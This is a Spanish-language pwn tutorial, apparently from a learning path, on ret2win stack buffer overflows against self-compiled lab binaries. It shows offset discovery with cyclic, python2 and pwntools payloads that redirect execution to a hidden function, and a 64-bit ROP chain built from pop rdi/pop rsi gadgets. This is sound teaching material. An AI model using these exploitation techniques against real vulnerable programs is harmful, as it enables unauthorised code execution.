---
original autor: CryptoCat
coautor: naibu3
---

#bufferOverflow #pwn 

# ¿Qué es?

Otra utilidad de un [[Buffer overflow]], sería en lugar de sobrescribir un valor, sobrescribir una dirección de retorno, de forma que al volver de la ejecución de una función, en lugar de volver a *main*, retorne a una función arbitraria.

# Ejercicios

## Ejercicio1

### Compilar el binario

Para este ejercicio utilizaremos el siguiente código:

```c
#include <stdio.h>

void hacked()
{
    printf("This function is TOP SECRET! How did you get in here?! :O\n");
    return;
}

void register_name()
{
    char buffer[16];

    printf("Name:\n");
    scanf("%s", buffer);
    printf("Hi there, %s\n", buffer);    
}

int main()
{
    register_name();

    return 0;
}
```

Como véis, hay una función `hacked()` a la que no se llama en ningún momento.

Vamos a comenzar por compilar el código (eliminando las protecciones):

```bash
gcc -o ret2win ret2win.c -fno-stack-protector -z execstack -no-pie -m32
```


### Reconocimiento del binario

Vamos a comenzar la fase de reconicimiento como siempre, lanzando [[checksec]] y `file`:

```bash
file ret2win
```
```file
ret2win: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=5978b724ef3c617522fe2a86c281910b02480b0e, for GNU/Linux 3.2.0, not stripped
```
> Vemos que es `LSB`, `dinamically linked`, `32-bit`...

```bash
checksec ret2win
```
```checksec
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x8048000)
RWX:      Has RWX segment
```
> Y no tiene protecciones activadas.

Vamos a probar a ejecutar:

```bash
./ret2win
```
```ret2win
Name:
hola
Hi there, hola
```

Vemos que nos pide un nombre y lo muestra por pantalla. Vamos a probar a introducir muchos carácteres:

```ret2win
Name:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Hi there, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[1]    68939 segmentation fault  ./ret2win
```

Vemos que ha dado un *segmentation fault*, lo que nos da la sospecha de que hemos sobreescrito algo, una variable o una dirección de retorno (*return address*).

Si vemos el código (puedes también descompilarlo con [[ghidra]]):

```c
void register_name()
{
    char buffer[16];

    printf("Name:\n");
    scanf("%s", buffer);
    printf("Hi there, %s\n", buffer);    
}
```

Vemos que se llama a la función `register_name()` que tiene una variable `buffer` y que se rellena con `scanf()`. También como apuntamos antes, hay una función `hacked()` a la que nunca se llama.

Parece ser que el *segmentation fault* puede ser debido a que `scanf` introduce más carácteres de los que permite *buffer*, probablemente sobreescribiendo la dirección de retorno de la función.

#### Explotación

Como vemos, al iniciar el programa, `main()` llama a `register_name()`, que pide un nombre, lo imprime y regresa. Sin embargo, podríamos tratar de sobreescribir la dirección de retorno de forma que `register_name()` no vuelva a name, sino que por ejemplo vuelva a `hacked()`.

Vamos a comenzar abriendo [[gdb]]-[[pwndbg]]:

```bash
gdb-pwndg ret2win
```

Podemos ver las unciones con:

```gdb
info functions
```
```gdb
[...]
0x08049182  hacked
0x080491ad  register_name
0x08049203  main
[...]
```

Ahora debemos ver a partir de que número de carácteres se empieza a sobreescribir la *return address*. Para ello, el propio plugin ([[pwndbg]]) incorpora una función interesante:

```gdb
cyclic 100
```
```gdb
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

Esto nos genera una secuencia de 100 carácteres en los que cada cuatro *a*, se intercala una letra. De esta forma podemos identificar cuándo se sobreescribe la *return address*.

```gdb
run
```
```ret2win
Name:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Hi there, aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Program received signal SIGSEGV, Segmentation fault.
```

Vemos que como era de esperar ha dado error, pero podemos ver más cosas:

```gdb
[...]
*EIP  0x61616168 ('haaa')
[...]
```

Nos interesan los 4 bits del puntero de instrucción (*instruction pointer*), `EIP`. Como vemos son `haaa`. Además, con `cyclic`, también podemos contar rápidamente la posición en qué empiezan esos bits:

```gdb
cyclic -l haaa
```
```cyclic
[...]
Found at offset 28
```


##### Prueba de concepto

Ya podríamos ir directamente a explotar la vulnerabilidad, sin embargo, hagamos una pequeña prueba. Ejecutamos la siguiente línea:

```python
python2 -c 'print 28*"A" + 4*"B" + 32*"C"'
```
```text
AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
```

Si ejecutamos y pasamos dicha cadena:

```gdb
run
```
```ret2win
Name:
AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
Hi there, AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
```
```ret2win
[...]
*EBP  0x41414141 ('AAAA')
*ESP  0xffffd100 ◂— 'CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC'
*EIP  0x42424242 ('BBBB')
[...]
```

Podemos ver que las *B* se están guardando en el puntero de pila, tal y como queríamos. A modo de spoiler para los siguientes temas, vemos que las *C* se guardan en `ESP`, esto podríamos aprovecharlo para introducir ahí un *shellcode* y que el valor que pusieramos en las *B* fuera esa dirección.


##### Insertando el *return adress*

Ya solo queda insertar el *return address* de `hacked` en la cadena que hemos generado. Para ello, debemos sacar la dirección. De la salida de `info functions` (la llamamos antes):

```gdb
[...]
0x08049182  hacked
[...]
```

Para insertarla en la cadena con las *A* utilizaremos python (puedes hacerlo también cambiando el valor con [[gdb]]). Recuerda ponerlo al revés ya que es `LSB` y mandarlo a un fichero, ya que no podemos copiarlo y pegarlo (como vimos en los ejercicios anteriores):

```python
python2 -c 'print 28*"A" + "\x82\x91\x04\x08"' > payload
```

Ejecutamos:

```bash
./ret2win < payload
```
```ret2win
Name:
Hi there, AAAAAAAAAAAAAAAAAAAAAAAAAAAA��
This function is TOP SECRET! How did you get in here?! :O
[1]    106112 segmentation fault  ./ret2win < payload
```

Vemos que hemos conseguido ejecutar la función! Da también un error de segmentación, debido a que la función `hacked` no tiene ningún `return` (eso debemos tenerlo en cuenta en ciertas situaciones).

Con [[gdb]]:

```gdb
run < payload
```

Y el resultado es el mismo.


### Script

Como siempre tenemos también un script escrito en python con la librería [[pwntools]] para resolver el ejercicio.

```python
#!/bin/python3
from pwn import *

exe = './ret2win'
io = process(exe)

padding = 28 #Cantidad de bytes hasta la direccion de retorno

payload = flat(
    b'A' * 28,
    0x08049182 #hacked()
)

# Send the payload
io.sendlineafter(b':', payload)

# Recibe las dos lineas que no necesitamos
io.recvline()
io.recvline()

print(io.recvline().decode()) #Imprime la linea de hacked

# Receive the flag
io.close()
```

## Ejercicio1

### Compilar el binario

Para este ejercicio utilizaremos el siguiente código (está en la carpeta de ejercicios):

```c
#include <stdio.h>

void hacked(int first, int second)
{
    if (first == 0xdeadbeef && second == 0xc0debabe){
        printf("This function is TOP SECRET! How did you get in here?! :O\n");
    }else{
        printf("Unauthorised access to secret function detected, authorities have been alerted!!\n");
    }

    return;
}

void register_name()
{
    char buffer[16];

    printf("Name:\n");
    scanf("%s", buffer);
    printf("Hi there, %s\n", buffer);    
}

int main()
{
    register_name();

    return 0;
}
```

Como veis, hay una función `hacked()` a la que no se llama en ningún momento y que recibe dos parámetros. En caso de que ambos parámetros cumplan la igualdad resolveremos el reto.

Vamos a comenzar por compilar el código (eliminando las protecciones):

```bash
gcc -o ret2win_params ret2win_params.c -fno-stack-protector -z execstack -no-pie -m32
```

### Reconocimiento del binario

Como lo hemos compilado nosotros y ya hemos visto el código fuente, vamos a saltar la parte de [[checksec]] y [[ghidra]]. Sin embargo, intenta lanzarlos para practicar.

Si lo ejecutamos:

```ret2win_params
Name:
naibu3
Hi there, naibu3
```

No vemos que pase nada, incluso si desbordamos el *buffer*:

```ret2win_params
Name:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Hi there, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[1]    16624 segmentation fault  ./ret2win_params
```

A continuación lanzamos [[gdb]]-[[pwndbg]]:

```bash
gdb-pwndbg ret2win_params
```

Vamos a crear una cadena con `cyclic` para detectar donde se empiezan a sobrescribir variables:

```gdb-pwndbg
cyclic 200
```
```cyclic
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
```

Ejecutamos el programa pasándole dicha cadena:

```gdb-pwndbg
pwndbg> run
Starting program: /home/naibu3/hack/aularedes/pwn_learning_path/ejercicios/03_Ret2Win_With_Parameters/ret2win_params 
Name:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
```

Vemos que se produce un error de segmentación (igual que antes). Si revisamos el contenido del puntero de instrucción (`EIP`), es decir, la *dirección de retorno*:

```gdb-pwndbg
[...]
*EIP  0x61616168 ('haaa')
[...]
```

Vemos que se ha sobrescrito con `haaa`, podemos calcular el *offset* con *cyclic*:

```bash
cyclic -l haaa
```
```cyclic
28
```

Vamos a crear un *payload* con python2 para que al igual que en la [sección anterior](Ret2Win.md), al terminar de ejecutar la función *register_name*, en lugar de volver a *main*, la dirección de retorno sea la de *hacked*. Para ello debemos ver cuál es la dirección de *hacked*, lo haremos descompilando la función y viendo la dirección de la primera línea:

```gdb-pwndbg
disassemble hacked
```
```gdb-pwndbg
Dump of assembler code for function hacked:
   0x08049182 <+0>:	push   ebp
   [...]
```

Ya podemos crear el *payload* (recordad que es *little-endian* ó *LSB*, por lo que va al revés):

```bash
python2 -c 'print "A"*28 + "\x82\x91\x04\x08" + "BBBB" + "CCCC" + "DDDD"' > payload
```
> Recordad redirigir la salida a un archivo, ya que al copiar y pegar se realiza una conversión que cambia el valor del *payload*.

Después de la dirección hemos añadido tres parámetros más, las *B* representan el puntero de pila (*stack pointer*); y las *C* y *D*, los dos argumentos que recibe la función. Si ejecutamos pasándole el *payload*:

```gdb-pwndbg
run < payload
```
```ret2win_params
Name:
Hi there, AAAAAAAAAAAAAAAAAAAAAAAAAAAA�BBBBCCCCDDDD
Unauthorised access to secret function detected, authorities have been alerted!!
```

Vemos que ha entrado en la función *hacked* pero como era de esperar, tenemos que dar un valor a los parámetros. Como vimos en el código fuente, el primer parámetro debe ser `0xdeadbeef` y el segundo `0xc0debabe`, así que modificamos el *payload*:

```gdb-pwndbg
python2 -c 'print "A"*28 + "\x82\x91\x04\x08" + "BBBB" + "\xef\xbe\xad\xde" + "\xbe\xba\xde\xc0"' > payload
```
> Las *B* las dejamos, ya que son el puntero de pila.

Si volvemos a ejecutar:

```gdb-pwndbg
run < payload
```
```ret2win_params
Name:
Hi there, AAAAAAAAAAAAAAAAAAAAAAAAAAAA�BBBBﾭ޾���
This function is TOP SECRET! How did you get in here?! :O
```

Y ya habríamos resuelto el ejercicio!


## Ejercicio2 (Con parámetros)

A continuación vamos a resolver un ejercicio similar pero con un binario de 64 bits.

### Compilar el binario

Para este ejercicio utilizaremos el siguiente código (está en la carpeta de ejercicios):

```c
#include <stdio.h>

void hacked(long first, long second)
{
    if (first == 0xdeadbeefdeadbeef && second == 0xc0debabec0debabe){
        printf("This function is TOP SECRET! How did you get in here?! :O\n");
    }else{
        printf("Unauthorised access to secret function detected, authorities have been alerted!!\n");
    }
}

void register_name()
{
    char buffer[16];

    printf("Name:\n");
    scanf("%s", buffer);
    printf("Hi there, %s\n", buffer);
}

int main()
{
    register_name();

    return 0;
}
```

Vemos que se parece al código del ejercicio anterior, sin embargo, lo compilaremos con arquitectura de 64 bits:

```bash
gcc -o ret2win_params_64 ret2win_params_64.c -fno-stack-protector -z execstack -no-pie -m64
```


### Reconocimiento del binario

Vamos a analizar las funciones con [[gdb]]-[[pwndbg]]:

```bash
gdb-pwndbg ret2win_params_64
```
```gdb-pwndbg
info functions
```
```gdb-pwndbg
[...]
0x0000000000401142  hacked
[...]
```

Vemos la función *hacked* (ya la vimos en el código fuente). Vamos a descompilarla:

```gdb-pwndbg
disassemble hacked
```
```x64
[...]
0x000000000040114a <+8>:	mov    QWORD PTR [rbp-0x8],rdi
0x000000000040114e <+12>:	mov    QWORD PTR [rbp-0x10],rsi
0x0000000000401152 <+16>:	movabs rax,0xdeadbeefdeadbeef
0x000000000040115c <+26>:	cmp    QWORD PTR [rbp-0x8],rax
0x0000000000401160 <+30>:	jne    0x401180 <hacked+62>
0x0000000000401162 <+32>:	movabs rax,0xc0debabec0debabe
0x000000000040116c <+42>:	cmp    QWORD PTR [rbp-0x10],rax
0x0000000000401170 <+46>:	jne    0x401180 <hacked+62>
[...]
```

Como podemos ver, los parámetros de la función (`rdi` y `rsi`) se guardan en el stack (en `rbp-0x8` y `rbp-0x10`, los *[]* quieren decir que son punteros, o sea que almacenan una dirección de memoria). Posteriormente, se comparan con una variable `rax`, que se asigna con los valores `0xdeadbeefdeadbeef` y  `0xc0debabec0debabe`.

Ahora no podremos hacer igual que con el binario de 32 bits (simplemente poner la dirección de retorno y los valores), debemos ver qué valores se almacenarán en dichos registros.

Comenzamos buscando cuándo se produce el *buffer overflow* con *cyclic*:

```bash
cyclic 100
```
```ret2win_params_64
Name:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Hi there, aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```
```gdb-pwndbg
[...]
*RBP  0x6161616661616165 ('eaaafaaa')
*RSP  0x7fffffffded8 ◂— 'gaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
*RIP  0x4011d6 (register_name+70) ◂— ret
[...]
```

Si nos fijamos, el puntero de instrucción (`RIP`) no ha cambiado, ya que si tratamos de introducir una dirección de memoria inválida no la aceptará. Por eso, debemos insertar los valores en el puntero de pila (`RSP`), para encontrar el *offset* tomamos los primeros 4 valores y volvemos a utilizar *cyclic*:

```bash
cyclic -l gaaa
```
```cyclic
24
```


### Explotación

Vamos a construir ahora nuestro *payload* que tendrá la siguiente estructura:

```
PADDING (24) + pop_rdi + param_1 + pop_rsi + param_2 + hacked
```

De esta forma, cargaremos en el *stack* dos instrucciones que guardarán en los registros correspondientes los argumentos de la función y la propia llamada a la función.

Para encontrar *pop_rdi* y *pop_rsi* (las instrucciones que guardarán los argumentos en sus correspondientes registros), debemos utilizar [[ropper]]:

```bash
ropper --file ret2win_params_64 --search "pop rdi"
```
```ropper
0x000000000040124b: pop rdi; ret;
```

```bash
ropper --file ret2win_params_64 --search "pop rsi"
```
```ropper
0x0000000000401249: pop rsi; pop r15; ret;
```

No tenemos `pop rsi` como tal, pero tenemos `pop rsi; pop r15`, así que tendremos que añadir un valor *basura* para que se guarde en `r15`. Así que el *payload* pasaría a tener la siguiente estructura:

```
PADDING (24) + pop_rdi + param_1 + pop_rsi_r15 + param_2 + basura + hacked
```

Sacando la dirección de *hacked* de [[gdb]]-[[pwndbg]] (`disassemble hacked`) y los parámetros del código fuente (codificados *LSB*), el comando para generar el *payload* con python2 quedaría:

```bash
python2 -c 'print "A"*24 + "\x4b\x12\x40\x00\x00\x00\x00\x00" + "\xef\xbe\xad\xde\xef\xbe\xad\xde" + "\x49\x12\x40\x00\x00\x00\x00\x00" + "\xbe\xba\xde\xc0\xbe\xba\xde\xc0" + "\x00\x00\x00\x00\x00\x00\x00\x00" + "\x42\x11\x40\x00\x00\x00\x00\x00"' > payload
```

Si ejecutamos el binario pasando el *payload*:

```bash
./ret2win_params_64 < payload
```
```ret2win_params_64
Name:
Hi there, AAAAAAAAAAAAAAAAAAAAAAAAK@
This function is TOP SECRET! How did you get in here?! :O
[1]    24118 segmentation fault  ./ret2win_params_64 < payload
```

Y ya habríamos resuelto el ejercicio!